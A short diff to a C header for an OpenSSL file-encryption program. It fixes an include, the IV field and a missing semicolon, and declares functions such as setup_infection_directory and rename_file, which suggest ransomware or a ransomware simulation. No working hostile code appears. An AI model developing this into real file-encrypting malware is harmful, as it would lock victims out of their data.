@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <ctype.h>
 #include <openssl/evp.h>
 #include <openssl/err.h>
 #include <openssl/rand.h>
@@ -19,7 +20,7 @@
 
 typedef struct {
     unsigned char *key;         // Encryption key
-    unsigned char *iv;          // Initialization vector
+    unsigned char iv[16];          // Initialization vector
     unsigned char *input;       // Plaintext or Ciphertext
     unsigned char *output;      // Ciphertext or Plaintext (depending on operation)
     int input_len;              // Length of input data
@@ -38,6 +39,6 @@ void    decrypt_files(const char *key_hex);
 void    setup_infection_directory();
 void    rename_file(const char *filename);
 void    handle_errors();
-void    hex_to_bin(const char *hex, unsigned char *bin, size_t len)
+void    hex_to_bin(const char *hex, unsigned char *bin, size_t len);
 
 #endif // ENCRYPTION_H
